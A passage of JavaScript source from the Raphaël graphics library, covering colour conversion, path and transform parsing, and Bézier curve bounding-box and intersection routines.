- b (number) blue\n     = (object) HSL object in format:\n     o {\n     o     h (number) hue\n     o     s (number) saturation\n     o     l (number) luminosity\n     o }\n    \\*/\n    R.rgb2hsl = function (r, g, b) {\n        b = prepareRGB(r, g, b);\n        r = b[0];\n        g = b[1];\n        b = b[2];\n\n        var H, S, L, M, m, C;\n        M = mmax(r, g, b);\n        m = mmin(r, g, b);\n        C = M - m;\n        H = (C == 0 ? null :\n             M == r ? (g - b) / C :\n             M == g ? (b - r) / C + 2 :\n                      (r - g) / C + 4);\n        H = ((H + 360) % 6) * 60 / 360;\n        L = (M + m) / 2;\n        S = (C == 0 ? 0 :\n             L < .5 ? C / (2 * L) :\n                      C / (2 - 2 * L));\n        return {h: H, s: S, l: L, toString: hsltoString};\n    };\n    R._path2string = function () {\n        return this.join(",").replace(p2s, "$1");\n    };\n    function repush(array, item) {\n        for (var i = 0, ii = array.length; i < ii; i++) if (array[i] === item) {\n            return array.push(array.splice(i, 1)[0]);\n        }\n    }\n    function cacher(f, scope, postprocessor) {\n        function newf() {\n            var arg = Array.prototype.slice.call(arguments, 0),\n                args = arg.join("\\u2400"),\n                cache = newf.cache = newf.cache || {},\n                count = newf.count = newf.count || [];\n            if (cache[has](args)) {\n                repush(count, args);\n                return postprocessor ? postprocessor(cache[args]) : cache[args];\n            }\n            count.length >= 1e3 && delete cache[count.shift()];\n            count.push(args);\n            cache[args] = f[apply](scope, arg);\n            return postprocessor ? postprocessor(cache[args]) : cache[args];\n        }\n        return newf;\n    }\n\n    var preload = R._preload = function (src, f) {\n        var img = g.doc.createElement("img");\n        img.style.cssText = "position:absolute;left:-9999em;top:-9999em";\n        img.onload = function () {\n            f.call(this);\n            this.onload = null;\n            g.doc.body.removeChild(this);\n        };\n        img.onerror = function () {\n            g.doc.body.removeChild(this);\n        };\n        g.doc.body.appendChild(img);\n        img.src = src;\n    };\n\n    function clrToString() {\n        return this.hex;\n    }\n\n    /*\\\n     * Raphael.getRGB\n     [ method ]\n     **\n     * Parses colour string as RGB object\n     > Parameters\n     - colour (string) colour string in one of formats:\n     # <ul>\n     #     <li>Colour name (â<code>red</code>â, â<code>green</code>â, â<code>cornflowerblue</code>â, etc)</li>\n     #     <li>#â¢â¢â¢ â shortened HTML colour: (â<code>#000</code>â, â<code>#fc0</code>â, etc)</li>\n     #     <li>#â¢â¢â¢â¢â¢â¢ â full length HTML colour: (â<code>#000000</code>â, â<code>#bd2300</code>â)</li>\n     #     <li>rgb(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â red, green and blue channelsâ values: (â<code>rgb(200,&nbsp;100,&nbsp;0)</code>â)</li>\n     #     <li>rgb(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %: (â<code>rgb(100%,&nbsp;175%,&nbsp;0%)</code>â)</li>\n     #     <li>hsb(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â hue, saturation and brightness values: (â<code>hsb(0.5,&nbsp;0.25,&nbsp;1)</code>â)</li>\n     #     <li>hsb(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %</li>\n     #     <li>hsl(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â same as hsb</li>\n     #     <li>hsl(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as hsb</li>\n     # </ul>\n     = (object) RGB object in format:\n     o {\n     o     r (number) red,\n     o     g (number) green,\n     o     b (number) blue\n     o     hex (string) color in HTML/CSS format: #â¢â¢â¢â¢â¢â¢,\n     o     error (boolean) true if string canât be parsed\n     o }\n    \\*/\n    R.getRGB = cacher(function (colour) {\n        if (!colour || !!((colour = Str(colour)).indexOf("-") + 1)) {\n            return {r: -1, g: -1, b: -1, hex: "none", error: 1, toString: clrToString};\n        }\n        if (colour == "none") {\n            return {r: -1, g: -1, b: -1, hex: "none", toString: clrToString};\n        }\n        !(hsrg[has](colour.toLowerCase().substring(0, 2)) || colour.charAt() == "#") && (colour = toHex(colour));\n        var res,\n            red,\n            green,\n            blue,\n            opacity,\n            t,\n            values,\n            rgb = colour.match(colourRegExp);\n        if (rgb) {\n            if (rgb[2]) {\n                blue = toInt(rgb[2].substring(5), 16);\n                green = toInt(rgb[2].substring(3, 5), 16);\n                red = toInt(rgb[2].substring(1, 3), 16);\n            }\n            if (rgb[3]) {\n                blue = toInt((t = rgb[3].charAt(3)) + t, 16);\n                green = toInt((t = rgb[3].charAt(2)) + t, 16);\n                red = toInt((t = rgb[3].charAt(1)) + t, 16);\n            }\n            if (rgb[4]) {\n                values = rgb[4][split](commaSpaces);\n                red = toFloat(values[0]);\n                values[0].slice(-1) == "%" && (red *= 2.55);\n                green = toFloat(values[1]);\n                values[1].slice(-1) == "%" && (green *= 2.55);\n                blue = toFloat(values[2]);\n                values[2].slice(-1) == "%" && (blue *= 2.55);\n                rgb[1].toLowerCase().slice(0, 4) == "rgba" && (opacity = toFloat(values[3]));\n                values[3] && values[3].slice(-1) == "%" && (opacity /= 100);\n            }\n            if (rgb[5]) {\n                values = rgb[5][split](commaSpaces);\n                red = toFloat(values[0]);\n                values[0].slice(-1) == "%" && (red *= 2.55);\n                green = toFloat(values[1]);\n                values[1].slice(-1) == "%" && (green *= 2.55);\n                blue = toFloat(values[2]);\n                values[2].slice(-1) == "%" && (blue *= 2.55);\n                (values[0].slice(-3) == "deg" || values[0].slice(-1) == "\\xb0") && (red /= 360);\n                rgb[1].toLowerCase().slice(0, 4) == "hsba" && (opacity = toFloat(values[3]));\n                values[3] && values[3].slice(-1) == "%" && (opacity /= 100);\n                return R.hsb2rgb(red, green, blue, opacity);\n            }\n            if (rgb[6]) {\n                values = rgb[6][split](commaSpaces);\n                red = toFloat(values[0]);\n                values[0].slice(-1) == "%" && (red *= 2.55);\n                green = toFloat(values[1]);\n                values[1].slice(-1) == "%" && (green *= 2.55);\n                blue = toFloat(values[2]);\n                values[2].slice(-1) == "%" && (blue *= 2.55);\n                (values[0].slice(-3) == "deg" || values[0].slice(-1) == "\\xb0") && (red /= 360);\n                rgb[1].toLowerCase().slice(0, 4) == "hsla" && (opacity = toFloat(values[3]));\n                values[3] && values[3].slice(-1) == "%" && (opacity /= 100);\n                return R.hsl2rgb(red, green, blue, opacity);\n            }\n            rgb = {r: red, g: green, b: blue, toString: clrToString};\n            rgb.hex = "#" + (16777216 | blue | (green << 8) | (red << 16)).toString(16).slice(1);\n            R.is(opacity, "finite") && (rgb.opacity = opacity);\n            return rgb;\n        }\n        return {r: -1, g: -1, b: -1, hex: "none", error: 1, toString: clrToString};\n    }, R);\n    /*\\\n     * Raphael.hsb\n     [ method ]\n     **\n     * Converts HSB values to hex representation of the colour.\n     > Parameters\n     - h (number) hue\n     - s (number) saturation\n     - b (number) value or brightness\n     = (string) hex representation of the colour.\n    \\*/\n    R.hsb = cacher(function (h, s, b) {\n        return R.hsb2rgb(h, s, b).hex;\n    });\n    /*\\\n     * Raphael.hsl\n     [ method ]\n     **\n     * Converts HSL values to hex representation of the colour.\n     > Parameters\n     - h (number) hue\n     - s (number) saturation\n     - l (number) luminosity\n     = (string) hex representation of the colour.\n    \\*/\n    R.hsl = cacher(function (h, s, l) {\n        return R.hsl2rgb(h, s, l).hex;\n    });\n    /*\\\n     * Raphael.rgb\n     [ method ]\n     **\n     * Converts RGB values to hex representation of the colour.\n     > Parameters\n     - r (number) red\n     - g (number) green\n     - b (number) blue\n     = (string) hex representation of the colour.\n    \\*/\n    R.rgb = cacher(function (r, g, b) {\n        function round(x) { return (x + 0.5) | 0; }\n        return "#" + (16777216 | round(b) | (round(g) << 8) | (round(r) << 16)).toString(16).slice(1);\n    });\n    /*\\\n     * Raphael.getColor\n     [ method ]\n     **\n     * On each call returns next colour in the spectrum. To reset it back to red call @Raphael.getColor.reset\n     > Parameters\n     - value (number) #optional brightness, default is `0.75`\n     = (string) hex representation of the colour.\n    \\*/\n    R.getColor = function (value) {\n        var start = this.getColor.start = this.getColor.start || {h: 0, s: 1, b: value || .75},\n            rgb = this.hsb2rgb(start.h, start.s, start.b);\n        start.h += .075;\n        if (start.h > 1) {\n            start.h = 0;\n            start.s -= .2;\n            start.s <= 0 && (this.getColor.start = {h: 0, s: 1, b: start.b});\n        }\n        return rgb.hex;\n    };\n    /*\\\n     * Raphael.getColor.reset\n     [ method ]\n     **\n     * Resets spectrum position for @Raphael.getColor back to red.\n    \\*/\n    R.getColor.reset = function () {\n        delete this.start;\n    };\n\n    // https://schepers.cc/getting-to-the-point\n    function catmullRom2bezier(crp, z) {\n        var d = [];\n        for (var i = 0, iLen = crp.length; iLen - 2 * !z > i; i += 2) {\n            var p = [\n                        {x: +crp[i - 2], y: +crp[i - 1]},\n                        {x: +crp[i],     y: +crp[i + 1]},\n                        {x: +crp[i + 2], y: +crp[i + 3]},\n                        {x: +crp[i + 4], y: +crp[i + 5]}\n                    ];\n            if (z) {\n                if (!i) {\n                    p[0] = {x: +crp[iLen - 2], y: +crp[iLen - 1]};\n                } else if (iLen - 4 == i) {\n                    p[3] = {x: +crp[0], y: +crp[1]};\n                } else if (iLen - 2 == i) {\n                    p[2] = {x: +crp[0], y: +crp[1]};\n                    p[3] = {x: +crp[2], y: +crp[3]};\n                }\n            } else {\n                if (iLen - 4 == i) {\n                    p[3] = p[2];\n                } else if (!i) {\n                    p[0] = {x: +crp[i], y: +crp[i + 1]};\n                }\n            }\n            d.push(["C",\n                  (-p[0].x + 6 * p[1].x + p[2].x) / 6,\n                  (-p[0].y + 6 * p[1].y + p[2].y) / 6,\n                  (p[1].x + 6 * p[2].x - p[3].x) / 6,\n                  (p[1].y + 6*p[2].y - p[3].y) / 6,\n                  p[2].x,\n                  p[2].y\n            ]);\n        }\n\n        return d;\n    }\n    /*\\\n     * Raphael.parsePathString\n     [ method ]\n     **\n     * Utility method\n     **\n     * Parses given path string into an array of arrays of path segments.\n     > Parameters\n     - pathString (string|array) path string or array of segments (in the last case it will be returned straight away)\n     = (array) array of segments.\n    \\*/\n    R.parsePathString = function (pathString) {\n        if (!pathString) {\n            return null;\n        }\n        var pth = paths(pathString);\n        if (pth.arr) {\n            return pathClone(pth.arr);\n        }\n\n        var paramCounts = {a: 7, c: 6, h: 1, l: 2, m: 2, r: 4, q: 4, s: 4, t: 2, v: 1, z: 0},\n            data = [];\n        if (R.is(pathString, array) && R.is(pathString[0], array)) { // rough assumption\n            data = pathClone(pathString);\n        }\n        if (!data.length) {\n            Str(pathString).replace(pathCommand, function (a, b, c) {\n                var params = [],\n                    name = b.toLowerCase();\n                c.replace(pathValues, function (a, b) {\n                    b && params.push(+b);\n                });\n                if (name == "m" && params.length > 2) {\n                    data.push([b][concat](params.splice(0, 2)));\n                    name = "l";\n                    b = b == "m" ? "l" : "L";\n                }\n                if (name == "r") {\n                    data.push([b][concat](params));\n                } else while (params.length >= paramCounts[name]) {\n                    data.push([b][concat](params.splice(0, paramCounts[name])));\n                    if (!paramCounts[name]) {\n                        break;\n                    }\n                }\n            });\n        }\n        data.toString = R._path2string;\n        pth.arr = pathClone(data);\n        return data;\n    };\n    /*\\\n     * Raphael.parseTransformString\n     [ method ]\n     **\n     * Utility method\n     **\n     * Parses given path string into an array of transformations.\n     > Parameters\n     - TString (string|array) transform string or array of transformations (in the last case it will be returned straight away)\n     = (array) array of transformations.\n    \\*/\n    R.parseTransformString = cacher(function (TString) {\n        if (!TString) {\n            return null;\n        }\n        var paramCounts = {r: 3, s: 4, t: 2, m: 6},\n            data = [];\n        if (R.is(TString, array) && R.is(TString[0], array)) { // rough assumption\n            data = pathClone(TString);\n        }\n        if (!data.length) {\n            Str(TString).replace(tCommand, function (a, b, c) {\n                var params = [],\n                    name = lowerCase.call(b);\n                c.replace(pathValues, function (a, b) {\n                    b && params.push(+b);\n                });\n                data.push([b][concat](params));\n            });\n        }\n        data.toString = R._path2string;\n        return data;\n    }, this, function(elem) {\n        if (!elem) return elem;\n        var newData = [];\n        for (var i = 0; i < elem.length; i++) {\n            var newLevel = [];\n            for (var j = 0; j < elem[i].length; j++) {\n                newLevel.push(elem[i][j]);\n            }\n            newData.push(newLevel);\n        }\n      return newData; } );\n    // PATHS\n    var paths = function (ps) {\n        var p = paths.ps = paths.ps || {};\n        if (p[ps]) {\n            p[ps].sleep = 100;\n        } else {\n            p[ps] = {\n                sleep: 100\n            };\n        }\n        setTimeout(function () {\n            for (var key in p) if (p[has](key) && key != ps) {\n                p[key].sleep--;\n                !p[key].sleep && delete p[key];\n            }\n        });\n        return p[ps];\n    };\n    /*\\\n     * Raphael.findDotsAtSegment\n     [ method ]\n     **\n     * Utility method\n     **\n     * Find dot coordinates on the given cubic bezier curve at the given t.\n     > Parameters\n     - p1x (number) x of the first point of the curve\n     - p1y (number) y of the first point of the curve\n     - c1x (number) x of the first anchor of the curve\n     - c1y (number) y of the first anchor of the curve\n     - c2x (number) x of the second anchor of the curve\n     - c2y (number) y of the second anchor of the curve\n     - p2x (number) x of the second point of the curve\n     - p2y (number) y of the second point of the curve\n     - t (number) position on the curve (0..1)\n     = (object) point information in format:\n     o {\n     o     x: (number) x coordinate of the point\n     o     y: (number) y coordinate of the point\n     o     m: {\n     o         x: (number) x coordinate of the left anchor\n     o         y: (number) y coordinate of the left anchor\n     o     }\n     o     n: {\n     o         x: (number) x coordinate of the right anchor\n     o         y: (number) y coordinate of the right anchor\n     o     }\n     o     start: {\n     o         x: (number) x coordinate of the start of the curve\n     o         y: (number) y coordinate of the start of the curve\n     o     }\n     o     end: {\n     o         x: (number) x coordinate of the end of the curve\n     o         y: (number) y coordinate of the end of the curve\n     o     }\n     o     alpha: (number) angle of the curve derivative at the point\n     o }\n    \\*/\n    R.findDotsAtSegment = function (p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t) {\n        var t1 = 1 - t,\n            t13 = pow(t1, 3),\n            t12 = pow(t1, 2),\n            t2 = t * t,\n            t3 = t2 * t,\n            x = t13 * p1x + t12 * 3 * t * c1x + t1 * 3 * t * t * c2x + t3 * p2x,\n            y = t13 * p1y + t12 * 3 * t * c1y + t1 * 3 * t * t * c2y + t3 * p2y,\n            mx = p1x + 2 * t * (c1x - p1x) + t2 * (c2x - 2 * c1x + p1x),\n            my = p1y + 2 * t * (c1y - p1y) + t2 * (c2y - 2 * c1y + p1y),\n            nx = c1x + 2 * t * (c2x - c1x) + t2 * (p2x - 2 * c2x + c1x),\n            ny = c1y + 2 * t * (c2y - c1y) + t2 * (p2y - 2 * c2y + c1y),\n            ax = t1 * p1x + t * c1x,\n            ay = t1 * p1y + t * c1y,\n            cx = t1 * c2x + t * p2x,\n            cy = t1 * c2y + t * p2y,\n            alpha = (90 - math.atan2(mx - nx, my - ny) * 180 / PI);\n        (mx > nx || my < ny) && (alpha += 180);\n        return {\n            x: x,\n            y: y,\n            m: {x: mx, y: my},\n            n: {x: nx, y: ny},\n            start: {x: ax, y: ay},\n            end: {x: cx, y: cy},\n            alpha: alpha\n        };\n    };\n    /*\\\n     * Raphael.bezierBBox\n     [ method ]\n     **\n     * Utility method\n     **\n     * Return bounding box of a given cubic bezier curve\n     > Parameters\n     - p1x (number) x of the first point of the curve\n     - p1y (number) y of the first point of the curve\n     - c1x (number) x of the first anchor of the curve\n     - c1y (number) y of the first anchor of the curve\n     - c2x (number) x of the second anchor of the curve\n     - c2y (number) y of the second anchor of the curve\n     - p2x (number) x of the second point of the curve\n     - p2y (number) y of the second point of the curve\n     * or\n     - bez (array) array of six points for bezier curve\n     = (object) point information in format:\n     o {\n     o     min: {\n     o         x: (number) x coordinate of the left point\n     o         y: (number) y coordinate of the top point\n     o     }\n     o     max: {\n     o         x: (number) x coordinate of the right point\n     o         y: (number) y coordinate of the bottom point\n     o     }\n     o }\n    \\*/\n    R.bezierBBox = function (p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y) {\n        if (!R.is(p1x, "array")) {\n            p1x = [p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y];\n        }\n        var bbox = curveDim.apply(null, p1x);\n        return {\n            x: bbox.min.x,\n            y: bbox.min.y,\n            x2: bbox.max.x,\n            y2: bbox.max.y,\n            width: bbox.max.x - bbox.min.x,\n            height: bbox.max.y - bbox.min.y\n        };\n    };\n    /*\\\n     * Raphael.isPointInsideBBox\n     [ method ]\n     **\n     * Utility method\n     **\n     * Returns `true` if given point is inside bounding boxes.\n     > Parameters\n     - bbox (string) bounding box\n     - x (string) x coordinate of the point\n     - y (string) y coordinate of the point\n     = (boolean) `true` if point inside\n    \\*/\n    R.isPointInsideBBox = function (bbox, x, y) {\n        return x >= bbox.x && x <= bbox.x2 && y >= bbox.y && y <= bbox.y2;\n    };\n    /*\\\n     * Raphael.isBBoxIntersect\n     [ method ]\n     **\n     * Utility method\n     **\n     * Returns `true` if two bounding boxes intersect\n     > Parameters\n     - bbox1 (string) first bounding box\n     - bbox2 (string) second bounding box\n     = (boolean) `true` if they intersect\n    \\*/\n    R.isBBoxIntersect = function (bbox1, bbox2) {\n        var i = R.isPointInsideBBox;\n        return i(bbox2, bbox1.x, bbox1.y)\n            || i(bbox2, bbox1.x2, bbox1.y)\n            || i(bbox2, bbox1.x, bbox1.y2)\n            || i(bbox2, bbox1.x2, bbox1.y2)\n            || i(bbox1, bbox2.x, bbox2.y)\n            || i(bbox1, bbox2.x2, bbox2.y)\n            || i(bbox1, bbox2.x, bbox2.y2)\n            || i(bbox1, bbox2.x2, bbox2.y2)\n            || (bbox1.x < bbox2.x2 && bbox1.x > bbox2.x || bbox2.x < bbox1.x2 && bbox2.x > bbox1.x)\n            && (bbox1.y < bbox2.y2 && bbox1.y > bbox2.y || bbox2.y < bbox1.y2 && bbox2.y > bbox1.y);\n    };\n    function base3(t, p1, p2, p3, p4) {\n        var t1 = -3 * p1 + 9 * p2 - 9 * p3 + 3 * p4,\n            t2 = t * t1 + 6 * p1 - 12 * p2 + 6 * p3;\n        return t * t2 - 3 * p1 + 3 * p2;\n    }\n    function bezlen(x1, y1, x2, y2, x3, y3, x4, y4, z) {\n        if (z == null) {\n            z = 1;\n        }\n        z = z > 1 ? 1 : z < 0 ? 0 : z;\n        var z2 = z / 2,\n            n = 12,\n            Tvalues = [-0.1252,0.1252,-0.3678,0.3678,-0.5873,0.5873,-0.7699,0.7699,-0.9041,0.9041,-0.9816,0.9816],\n            Cvalues = [0.2491,0.2491,0.2335,0.2335,0.2032,0.2032,0.1601,0.1601,0.1069,0.1069,0.0472,0.0472],\n            sum = 0;\n        for (var i = 0; i < n; i++) {\n            var ct = z2 * Tvalues[i] + z2,\n                xbase = base3(ct, x1, x2, x3, x4),\n                ybase = base3(ct, y1, y2, y3, y4),\n                comb = xbase * xbase + ybase * ybase;\n            sum += Cvalues[i] * math.sqrt(comb);\n        }\n        return z2 * sum;\n    }\n    function getTatLen(x1, y1, x2, y2, x3, y3, x4, y4, ll) {\n        if (ll < 0 || bezlen(x1, y1, x2, y2, x3, y3, x4, y4) < ll) {\n            return;\n        }\n        var t = 1,\n            step = t / 2,\n            t2 = t - step,\n            l,\n            e = .01;\n        l = bezlen(x1, y1, x2, y2, x3, y3, x4, y4, t2);\n        while (abs(l - ll) > e) {\n            step /= 2;\n            t2 += (l < ll ? 1 : -1) * step;\n            l = bezlen(x1, y1, x2, y2, x3, y3, x4, y4, t2);\n        }\n        return t2;\n    }\n    function intersect(x1, y1, x2, y2, x3, y3, x4, y4) {\n        if (\n            mmax(x1, x2) < mmin(x3, x4) ||\n            mmin(x1, x2) > mmax(x3, x4) ||\n            mmax(y1, y2) < mmin(y3, y4) ||\n            mmin(y1, y2) > mmax(y3, y4)\n        ) {\n            return;\n        }\n        var nx = (x1 * y2 - y1 * x2) * (x3 - x4) - (x1 - x2) * (x3 * y4 - y3 * x4),\n            ny = (x1 * y2 - y1 * x2) * (y3 - y4) - (y1 - y2) * (x3 * y4 - y3 * x4),\n            denominator = (x1 - x2) * (y3 - y4) - (y1 - y2) * (x3 - x4);\n\n        if (!denominator) {\n            return;\n        }\n        var px = nx / denominator,\n            py = ny / denominator,\n            px2 = +px.toFixed(2),\n            py2 = +py.toFixed(2);\n        if (\n            px2 < +mmin(x1, x2).toFixed(2) ||\n            px2 > +mmax(x1, x2).toFixed(2) ||\n            px2 < +mmin(x3, x4).toFixed(2) ||\n            px2 > +mmax(x3, x4).toFixed(2) ||\n            py2 < +mmin(y1, y2).toFixed(2) ||\n            py2 > +mmax(y1, y2).toFixed(2) ||\n            py2 < +mmin(y3, y4).toFixed(2) ||\n            py2 > +mmax(y3, y4).toFixed(2)\n        ) {\n            return;\n        }\n        return {x: px, y: py};\n    }\n    function inter(bez1, bez2) {\n        return interHelper(bez1, bez2);\n    }\n    function interCount(bez1, bez2) {\n        return interHelper(bez1, bez2, 1);\n    }\n    function interHelper(bez1, bez2, justCount) {\n        var bbox1 = R.bezierBBox(bez1),\n            bbox2 = R.bezierBBox(bez2);\n        if (!R.isBBoxIntersect(bbox1, bbox2)) {\n            return justCount ? 0 : [];\n        }\n        var l1 = bezlen.apply(0, bez1),\n            l2 = bezlen.apply(0, bez2),\n            n1 = mmax(~~(l1 / 5), 1),\n            n2 = mmax(~~(l2 / 5), 1),\n            dots1 = [],\n            dots2 = [],\n            xy = {},\n            res = justCount ? 0 : [];\n        for (var i = 0; i < n1 + 1; i++) {\n            var p = R.findDotsAtSegment.apply(R, bez1.concat(i / n1));\n            dots1.push({x: p.x, y: p.y, t: i / n1});\n        }\n        for (i = 0; i < n2 + 1; i++) {\n            p = R.findDotsAtSegment.apply(R, bez2.concat(i / n2));\n            dots2.push({x: p.x, y: p.y, t: i / n2});\n        }\n        for (i = 0; i < n1; i++) {\n            for (var j = 0; j < n2; j++) {\n                var di = dots1[i],\n                    di1 = dots1[i + 1],\n                    dj = dots2[j],\n                    dj1 = dots2[j + 1],\n                    ci = abs(di1.x - di.x) < .001 ? "y" : "x",\n                    cj = abs(dj1.x - dj.x) < .001 ? "y" : "x",\n                    is = intersect(di.x, di.y, di1.x, di1.y, dj.x, dj.y, dj1.x, dj1.y);\n                if (is) {\n                    if (xy[is.x.toFixed(4)] == is.y.toFixed(4)) {\n                        continue;\n                    }\n                    xy[is.x.toFixed(4)] = is.y.toFixed(4);\n                    var t1 = di.t + abs((is[ci] - di[ci]) / (di1[ci] - di[ci])) * (di1.t - di.t),\n                        t2 = dj.t + abs((is[cj] - dj[cj]) / (dj1[cj] - dj[cj])) * (dj1.t - dj.t);\n                    if (t1 >= 0 && t1 <= 1.001 && t2 >= 0 && t2 <= 1.001) {\n                        if (justCount) {\n                            res++;\n                        } else {\n                            res.push({\n                                x: is.x,\n                                y: is.y,\n                                t1: mmin(t1, 1),\n                                t2: mmin(t2, 1)\n                            });\n                        }\n                    }\n                }\n            }\n        }\n        return res;\n    }\n    /*\\\n     * Raphael.pathIntersection\n     [ method ]\n     **\n     * Utility method\n     **\n     * Finds intersections of two paths\n     > Parameters\n     - path1 (string) path string\n     - path2 (string) path string\n     = (array) dots of intersection\n     o [\n     o     {\n     o         x: (number) x coordinate of the point\n     o         y: (number) y coordinate of the point\n     o         t1: (number) t value for segment of path1\n     o         t2: (number) t value for segment of path2\n     o         segment1: (number) order number for segment of path1\n     o         segment2: (number) order number for segment of path2\n     o         bez1: (array) eight coordinates representing beziÃ©r curve for the segment of path1\n     o         bez2: (array) eight coordinates representing beziÃ©r curve for the segment of path2\n     o     }\n     o ]\n    \\*/\n    R.pathIntersection = function (path1, path2) {\n        return interPathHelper(path1, path2);\n    };\n    R.pathIntersectionNumber = function (path1, path2) {\n        return interPathHelper(path1, path2, 1);\n    };\n    function interPathHelper(path1, path2, justCount) {\n        path1 = R._path2curve(path1);\n        path2 = R._path2curve(path2);\n        var x1, y1, x2, y2, x1m, y1m, x2m, y2m, bez1, bez2,\n            res = justCount ? 0 : [];\n        for (var i = 0, ii = path1.length; i < ii; i++) {\n            var pi = path1[i];\n            if (pi[0] == "M") {\n                x1 = x1m = pi[1];\n                y1 = y1m = pi[2];\n            } else {\n                if (pi[0] == "C") {\n                    bez1 = [x1, y1].concat(pi.slice(1));\n                    x1 = bez1[6];\n                    y1 = bez1[7];\n                } else {\n                    bez1 = [x1, y1, x1, y1, x1m, y1m, x1m, y1m];\n                    x1 = x1m;\n                    y1 = y1m;\n                }\n                for (var j = 0, jj = path2.length; j < jj; j++) {\n                    var pj = path2[j];\n                    if (pj[0] == "M") {\n                        x2 = x2m = pj[1];\n                        y2 = y2m = pj[2];\n                    } else {\n                        if (pj[0] == "C") {\n                            bez2 = [x2, y2].concat(pj.slice(1));\n                            x2 = bez2[6];\n                            y2 = bez2[7];\n                        } else {\n                            bez2 = [x2, y2, x2, y2, x2m, y2m, x2m, y2m];\n                            x2 = x2m;\n                            y2 = y2m;\n                        }\n                        var intr = interHelper(bez1, bez2, justCount);\n                        if (justCount) {\n                            res += intr;\n                        } else {\n                            for (var k = 0, kk = intr.length; k < kk; k++) {\n                                intr[k].segment1 = i;\n                                intr[k].segment2 = j;\n                                intr[k].bez1 = bez1;\n                                intr[k].bez2 = bez2;\n                            }\n                            res = res.concat(intr);\n                        }\n                    }\n                }\n            }\n        }\n        return res;\n    }\n    /*\\\n     * Raphael.isPointInsidePath\n     [ method ]\n     **\n     * Utility method\n     **\n     * Returns `true` if given point is inside a given closed path.\n     > Parameters\n     - path (string) path string\n     - x (number) x of the point\n     - y (number) y of the point\n     = (boolean) true, if point is inside the path\n    \\*/\n    R.isPointInsidePath = function (path, x, y) {\n        var bbox = R.pathBBox(path);\n        return R.isPointInsideBBox(bbox, x, y) &&\n               interPathHelper(path, [["M", x, y], ["H", bbox.x2 + 10]], 1) % 2 == 1;\n    };\n    R._removedFactory = function (methodname) {\n        return function () {\n            eve("raphael.log", null, "Rapha\\xebl: you are calling to method \\u201c" + methodname + "\\u201d of removed object", methodname);\n        };\n    };\n    /*\\\n     * Raphael.pathBBox\n     [ method ]\n     **\n     * Utility method\n     **\n     * Return bounding box of a given path\n     > Parameters\n     - path (string) path string\n     = (object) bounding box\n     o {\n     o     x: (number) x coordinate of the left top point of the box\n     o     y: (number) y coordinate of the left top point of the box\n     o     x2: (number) x coordinate of the right bottom point of the box\n     o     y2: (number) y coordinate of the right bottom point of the box\n     o     width: (number) width of the box\n     o     height: (number) height of the box\n     o     cx: (number) x coordinate of the center of the box\n     o     cy: (number) y coordinate of the center of the box\n     o }\n    \\*/\n    var pathDimensions = R.pathBBox = function (path) {\n        var pth = paths(path);\n        if (pth.bbox) {\n            return clone(pth.bbox);\n        }\n        if (!path) {\n            return {x: 0, y: 0, width: 0, height: 0, x2: 0, y2: 0};\n        }\n        path = path2curve(path);\n        var x = 0,\n            y = 0,\n            X = [],\n            Y = [],\n            p;\n        for (var i = 0, ii = path.length; i < ii; i++) {\n            p = path[i];\n            if (p[0] == "M") {\n                x = p[1];\n                y = p[2];\n                X.push(x);\n                Y.push(y);\n            } else {\n                var dim = curveDim(x, y, p[1], p[2], p[3], p[4], p[5], p[6]);\n                X = X[concat](dim.min.x, dim.max.x);\n                Y = Y[concat](dim.min.y, dim.max.y);\n                x = p[5];\n                y = p[6];\n            }\n        }\n        var xmin = mmin[apply](0, X),\n            ymin = mmin[apply](0, Y),\n            xmax = mmax[apply](0, X),\n            ymax = mmax[apply](0, Y),\n            width = xmax - xmin,\n            height = ymax - ymin,\n                bb = {\n                x: xmin,\n                y: ymin,\n                x2: xmax,\n                y2: ymax,\n                width: width,\n                height: height,\n                cx: xmin + width / 2,\n                cy: ymin + height / 2\n            };\n        pth.bbox = clone(bb);\n        return bb;\n    },\n        pathClone = function (pathArray) {\n            var res = clone(pathArray);\n            res.toString = R._path2string;\n            return res;\n        },\n        pathToRelative = R._pathToRelative = function (pathArray) {\n            var pth = paths(pathArray);\n            if (pth.rel) {\n                return pathClone(pth.rel);\n            }\n            if (!R.is(pathArray, array) || !R.is(pathArray && pathArray[0], array)) { // rough assumption\n                pathArray = R.parsePathString(pathArray);\n            }\n            var res = [],\n                x = 0,\n                y = 0,\n                mx = 0,\n                my = 0,\n                start = 0;\n            if (pathArray[0][0] == "M") {\n                x = pathArray[0][1];\n                y = pathArray[0][2];\n                mx = x;\n                my = y;\n                start++;\n                res.push(["M", x, y]);\n            }\n            for (var i = start, ii = pathArray.length; i < ii; i++) {\n                var r = res[i] = [],\n                    pa = pathArray[i];\n                if (pa[0] != lowerCase.call(pa[0])) {\n                    r[0] = lowerCase.call(pa[0]);\n                    switch (r[0]) {\n                        case "a":\n                            r[1] = pa[1];\n                            r[2] = pa[2];\n                            r[3] = pa[3];\n                            r[4] = pa[4];\n                            r[5] = pa[5];\n                            r[6] = +(pa[6] - x).toFixed(3);\n                            r[7] = +(pa[7] - y).toFixed(3);\n                            break;\n                        case "v":\n                            r[1] = +(pa[1] - y).toFixed(3);\n                            break;\n                        case "m":\n                            mx = pa[1];\n                            my = pa[2];\n                        default:\n                            for (var j = 1, jj = pa.length; j < jj; j++) {\n                                r[j] = +(pa[j] - ((j % 2) ? x : y)).toFixed(3);\n                            }\n                    }\n                } else {\n                    r = res[i] = [];\n                    if (pa[0] == "m") {\n                        mx = pa[1] + x;\n                        my = pa[2] + y;\n                    }\n                    for (var k = 0, kk = pa.length; k < kk; k++) {\n                        res[i][k] = pa[k];\n                    }\n                }\n                var len = res[i].length;\n                switch (res[i][0]) {\n                    case "z":\n                        x = mx;\n                        y = my;\n                        break;\n                    case "h":\n                        x += +res[i][len - 1];\n                        break;\n                    case "v":\n                        y += +res[i][len - 1];\n                        break;\n                    default:\n                        x += +res[i][len - 2];\n                        y += +res[i][len - 1];\n                }\n            }\n            res.toString = R._path2string;\n            pth.rel = pathClone(res);\n            return res;\n        },\n        pathToAbsolute = R._pathToAbsolute = function (pathArray) {\n            var pth = 